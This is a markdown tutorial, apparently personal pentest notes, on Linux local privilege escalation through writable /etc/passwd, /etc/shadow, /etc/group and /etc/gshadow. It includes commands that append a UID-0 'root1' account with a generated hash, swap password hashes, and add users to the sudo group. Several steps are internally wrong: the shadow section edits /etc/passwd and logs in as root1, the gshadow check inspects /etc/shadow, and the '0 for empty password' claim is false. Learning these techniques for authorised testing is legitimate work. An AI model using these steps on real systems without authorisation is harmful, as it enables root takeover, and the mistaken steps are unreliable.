
 
##  **Default Permissions of Important Files in Linux**

#### Understanding file permissions is crucial for privilege escalation and security assessments. Below are the default permissions of critical system files in Linux:

the default permissions of critical system files in Linux:

| **File**       | **Default Permissions** | **Owner** | **Group** | **Purpose**                                     |
| -------------- | ----------------------- | --------- | --------- | ----------------------------------------------- |
| `/etc/passwd`  | `-rw-r--r-- (644)`      | `root`    | `root`    | Stores user account details (but not passwords) |
| `/etc/shadow`  | `-rw------- (600)`      | `root`    | `shadow`  | Stores hashed passwords (only root can access)  |
| `/etc/group`   | `-rw-r--r-- (644)`      | `root`    | `root`    | Stores group information                        |
| `/etc/gshadow` | `-rw------- (600)`      | `root`    | `shadow`  | Stores group passwords (if any)                 |
| `/etc/crontab` | `-rw-r--r-- (644)`      | `root`    | `root`    | System-wide cron jobs                           |
| `/etc/sudoers` | `-r--r----- (440)`      | `root`    | `root`    | Controls sudo access                            |
## Privilege Escalation via sensitive files

### 1. Privilege Escalation through **/etc/passwd**


**If we got write permission for other user on /etc/passwd  then we can create hash and add into it ** 

#####  1.1 check the permission of /etc/passwd
```bash
ls -lha /etc/passwd
```

![](Attachments/attachments/Pasted%20image%2020250221183500.png)

#####  1.2 generate password hash

```bash title:"generate password hash"
openssl passwd 1234
```

![](Attachments/attachments/Pasted%20image%2020250221172947.png)

##### 1.3 Edit The /etc/passwd  

read  the /etc/passwd file Then 
Clone the root user information edit root to root1 (we can also add only passwd hash for root user)
After that paste into /etc/passwd file and also add the created hash password.( you can use any editor but here I am going to use echo )
```bash
echo 'root1:$1$NBIvZax5$jv3IXEGcWtVxsfayNTv9B0:0:0:root:/root:/bin/bash' >> /etc/passwd 
```

![](Attachments/attachments/Pasted%20image%2020250221182917.png)

Apart of hash we can also use 0 (zero) for empty password 

##### 1.4 Then login with *root1* user using our password 
![](Attachments/attachments/Pasted%20image%2020250221192427.png)

---


### 2. Privilege Escalation through **/etc/shadow**

**If we got write permission for other user on /etc/shadow then we can create hash and add into it or we can go with crack the hash using password cracking tools  ** 

#####  2.1 check the permission of /etc/shadow
```bash
ls -lha /etc/shadow
```

![](Attachments/attachments/Pasted%20image%2020250221190658.png)


#####  2.2 generate password hash

```bash title:"generate password hash"
openssl passwd 1234
```

![](Attachments/attachments/Pasted%20image%2020250221172947.png)


##### 2.3 Edit The /etc/shadow file 
Replace root hash with our created hash 

```bash
vim /etc/passwd    #will open vim editor then replace root password hash
```

![](Attachments/attachments/Pasted%20image%2020250221192122.png)
![](Attachments/attachments/Pasted%20image%2020250221192032.png)

##### 2.4 Then login with root1 user using our password

```bash
su - root1
```

![](Attachments/attachments/Pasted%20image%2020250221192427.png)


---


### 3. Privilege Escalation through **/etc/group**

**if we got write permission for other user on /etc/group then we can add user into group**
#####  3.1 check the permission of /etc/group
```bash
ls -lha /etc/group
```

![](Attachments/Pasted%20image%2020250221193720.png)


##### 3.2 Edit the /etc/group
Add user into **wheel/sudo** group (if system is debian base then add into sudo group or if system is red-hat base then add into wheel group)
Here I am using debian base system so I'll add user into sudo group 

```bash
vim /etc/group
```

![](Attachments/Pasted%20image%2020250221200113.png)
![](Attachments/Pasted%20image%2020250221200237.png)


##### 3.3  Reset Connection
Firstly we should logout or reset the connection after that we can get root access

```bash
exit
```

![](Attachments/Pasted%20image%2020250221200849.png)

##### 3.4  login with normal user / get Shell
![](Attachments/Pasted%20image%2020250221201128.png)

then get root access using **sudo su** command
```bash
sudo su
```

![](Attachments/Pasted%20image%2020250221201305.png)

---

### 4. Privilege Escalation through **/etc/gshadow**
if we got write permission for other user on **/etc/gshadow** then we can add hash for **sudo/wheel** group to get root access

#####  4.1 check the permission of **/etc/gshadow**
```bash
ls -lha /etc/shadow
```

![](Attachments/Pasted%20image%2020250221204324.png)


#####  4.2 generate password hash

```bash title:"generate password hash"
openssl passwd 1234
```

![](Attachments/attachments/Pasted%20image%2020250221172947.png)


#####  4.3 edit the /etc/gshadow
edit the **/etc/gshadow** and add generated has for** **sudo/wheel** group. ( according to os *debian = sudo*  or *red-hat = wheel *)

```bash
vim /etc/gshadow
```

![](Attachments/Pasted%20image%2020250221205551.png)
![](Attachments/Pasted%20image%2020250221205227.png)

##### 4.4  login with **sudo / wheel** group 

```bash
sg sudo #acording to os sudo / wheel
```

After that we will get all access 
![](Attachments/Pasted%20image%2020250221210301.png)

Then run **sudo su** command 
```bash
sudo su 
```

![](Attachments/Pasted%20image%2020250221210441.png)
